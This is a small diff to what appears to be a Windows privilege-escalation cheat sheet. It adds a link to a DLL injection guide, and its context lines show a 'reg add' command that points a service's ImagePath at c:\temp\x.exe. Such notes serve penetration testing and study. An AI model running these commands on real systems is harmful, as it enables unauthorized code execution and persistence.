@@ -397,6 +397,9 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 }
 ```
 
+### [DLL Injection recommended by Bugbyt3]
+https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
+
 ### [Creating service in registry]
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
